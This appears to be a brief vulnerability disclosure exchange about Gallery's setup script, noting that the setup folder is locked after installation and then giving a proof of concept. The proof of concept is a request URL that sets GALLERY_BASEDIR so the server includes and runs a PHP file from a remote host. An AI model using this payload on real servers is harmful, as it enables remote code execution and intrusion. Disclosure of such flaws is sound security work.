The URL you mention is accessible only during the setup of Gallery.
Completing the installation, the user runs secure.sh or secure.bat which
"chmod 0 setup" making the vulnerability you mention inaccessible to the
web.

-Proof of concept-
It is possible to include any php file from a remote host, and execute
it on the target's server.
This works:
http://victim/path_to_gallery/setup/index.php?GALLERY_BASEDIR=http://tes
ter/
If the file "http://tester/util.php" exists, it will be included.
